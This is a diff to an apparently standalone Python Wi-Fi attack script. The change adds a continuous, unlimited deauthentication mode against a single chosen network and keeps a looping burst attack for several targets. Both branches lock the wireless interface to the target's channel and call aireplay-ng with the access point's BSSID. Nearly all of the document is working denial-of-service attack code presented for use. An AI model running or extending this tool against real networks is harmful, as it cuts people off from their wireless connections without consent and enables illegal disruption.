@@ -309,68 +309,105 @@ if mode == "1":
         print(f"\n{Colors.Y}[*] Starting continuous loop attack... (CTRL+C to rescan){Colors.N}\n")
 
         try:
-            while True:
-                for bssid, ch, essid, power in targets:
-                    clear()
-                    big_text("ATTACKING", Colors.Y)
-                    print(f"Network : {Colors.BOLD}{essid}{Colors.N}")
-                    print(f"Signal  : {signal_bar(power)}")
-                    print(f"BSSID   : {bssid} | CH: {ch}\n")
+            if len(targets) == 1:
+                # ===== SINGLE NETWORK → continuous attack =====
+                bssid, ch, essid, power = targets[0]
+                clean_bssid = bssid.strip().upper()
 
-                    clean_bssid = bssid.strip().upper()
+                clear()
+                big_text("CONTINUOUS ATTACK", Colors.Y)
+                print(f"Network : {Colors.BOLD}{essid}{Colors.N}")
+                print(f"Signal  : {signal_bar(power)}")
+                print(f"BSSID   : {bssid} | CH: {ch}\n")
 
-                    # === AGGRESSIVE CHANNEL LOCK ===
-                    print(f"{Colors.Y}[*] Locking to channel {ch}...{Colors.N}")
-                    for _ in range(3):   # Try multiple times
-                     run(f"iw dev {IFACE} set channel {ch} 2>/dev/null")
-                     run(f"iwconfig {IFACE} channel {ch} 2>/dev/null")
-                     run(f"iwconfig {IFACE} channel {ch}")
-                     time.sleep(1.0)
+                print(f"{Colors.Y}[*] Locking to channel {ch}...{Colors.N}")
+                for _ in range(3):
+                    run(f"iw dev {IFACE} set channel {ch} 2>/dev/null")
+                    run(f"iwconfig {IFACE} channel {ch} 2>/dev/null")
+                    run(f"iwconfig {IFACE} channel {ch}")
+                    time.sleep(1.0)
 
-                    current = run(f"iw dev {IFACE} info 2>/dev/null | grep -oP 'channel \\K\\d+'").strip()
-                    print(f"{Colors.C}[i] Current channel: {current or 'Unknown'}{Colors.N}")
+                current = run(f"iw dev {IFACE} info 2>/dev/null | grep -oP 'channel \\K\\d+'").strip()
+                print(f"{Colors.C}[i] Current channel: {current or 'Unknown'}{Colors.N}")
 
-                    subprocess.run(["pkill", "-9", "aireplay-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                subprocess.run(["pkill", "-9", "aireplay-ng"],
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-                    print(f"{Colors.Y}[*] Sending deauth to {essid} ({clean_bssid})...{Colors.N}")
+                print(f"{Colors.Y}[*] Continuous deauth on {essid} (CTRL+C to stop)...{Colors.N}")
+                print(f"{Colors.C}Running: aireplay-ng -0 0 -a {clean_bssid} --ignore-negative-one {IFACE}{Colors.N}\n")
 
-                    try:
-                        cmd = [
-                            "aireplay-ng", 
-                            "-0", "5",
-                            "-a", clean_bssid,
-                            "--ignore-negative-one",
-                            IFACE
-                        ]
+                # -0 0 = infinite continuous deauth
+                subprocess.run([
+                    "aireplay-ng",
+                    "-0", "0",
+                    "-a", clean_bssid,
+                    "--ignore-negative-one",
+                    IFACE
+                ])
 
-                        print(f"{Colors.C}Running: {' '.join(cmd)}{Colors.N}")
+            else:
+                # ===== MULTIPLE NETWORKS → original one-by-one loop =====
+                while True:
+                    for bssid, ch, essid, power in targets:
+                        clear()
+                        big_text("ATTACKING", Colors.Y)
+                        print(f"Network : {Colors.BOLD}{essid}{Colors.N}")
+                        print(f"Signal  : {signal_bar(power)}")
+                        print(f"BSSID   : {bssid} | CH: {ch}\n")
 
-                        result = subprocess.run(cmd, timeout=10, 
-                                              stdout=subprocess.PIPE, 
-                                              stderr=subprocess.PIPE, 
-                                              text=True)
+                        clean_bssid = bssid.strip().upper()
 
-                        if result.returncode != 0:
-                            err = (result.stdout + result.stderr).strip()
-                            print(f"{Colors.R}{err[:500]}{Colors.N}")
-                        else:
-                            print(f"{Colors.G}[+] Packets sent successfully{Colors.N}")
+                        print(f"{Colors.Y}[*] Locking to channel {ch}...{Colors.N}")
+                        for _ in range(3):
+                            run(f"iw dev {IFACE} set channel {ch} 2>/dev/null")
+                            run(f"iwconfig {IFACE} channel {ch} 2>/dev/null")
+                            run(f"iwconfig {IFACE} channel {ch}")
+                            time.sleep(1.0)
 
-                    except subprocess.TimeoutExpired:
-                        print(f"{Colors.G}[+] Deauth burst completed{Colors.N}")
-                    except Exception as e:
-                        print(f"{Colors.R}Error: {e}{Colors.N}")
+                        current = run(f"iw dev {IFACE} info 2>/dev/null | grep -oP 'channel \\K\\d+'").strip()
+                        print(f"{Colors.C}[i] Current channel: {current or 'Unknown'}{Colors.N}")
 
-                    time.sleep(2.5)
+                        subprocess.run(["pkill", "-9", "aireplay-ng"],
+                                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-                print(f"\n{Colors.G}[+] Full cycle done. Looping again on selected targets...{Colors.N}")
-                time.sleep(3)
+                        print(f"{Colors.Y}[*] Sending deauth to {essid} ({clean_bssid})...{Colors.N}")
+
+                        try:
+                            cmd = [
+                                "aireplay-ng",
+                                "-0", "5",
+                                "-a", clean_bssid,
+                                "--ignore-negative-one",
+                                IFACE
+                            ]
+                            print(f"{Colors.C}Running: {' '.join(cmd)}{Colors.N}")
+
+                            result = subprocess.run(cmd, timeout=10,
+                                                    stdout=subprocess.PIPE,
+                                                    stderr=subprocess.PIPE,
+                                                    text=True)
+
+                            if result.returncode != 0:
+                                err = (result.stdout + result.stderr).strip()
+                                print(f"{Colors.R}{err[:500]}{Colors.N}")
+                            else:
+                                print(f"{Colors.G}[+] Packets sent successfully{Colors.N}")
+
+                        except subprocess.TimeoutExpired:
+                            print(f"{Colors.G}[+] Deauth burst completed{Colors.N}")
+                        except Exception as e:
+                            print(f"{Colors.R}Error: {e}{Colors.N}")
+
+                        time.sleep(2.5)
+
+                    print(f"\n{Colors.G}[+] Full cycle done. Looping again on selected targets...{Colors.N}")
+                    time.sleep(3)
 
         except KeyboardInterrupt:
             print(f"\n{Colors.Y}Loop stopped. Returning to scan...{Colors.N}")
-            subprocess.run(["pkill", "-9", "aireplay-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.run(["pkill", "-9", "aireplay-ng"],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             time.sleep(2)
-           # continue
 
 
 
